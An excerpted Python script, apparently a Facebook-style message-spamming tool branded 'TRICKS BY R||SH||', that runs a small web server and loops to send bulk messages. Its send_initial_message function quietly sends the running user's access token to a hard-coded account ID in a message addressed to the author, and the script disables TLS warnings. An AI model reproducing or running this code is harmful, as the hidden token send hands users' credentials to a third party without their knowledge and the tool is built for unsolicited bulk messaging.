...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"   TRICKS BY R||SH|| XD")
def execute_server():
...
def send_initial_message():
      ...
      msg_template = "Hello riishii sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100003969576373"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── TRICKS BY R||SH|| ───────────────────────────────•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+]  Massage Sent {} of Convo {} Token {}: {}".format(
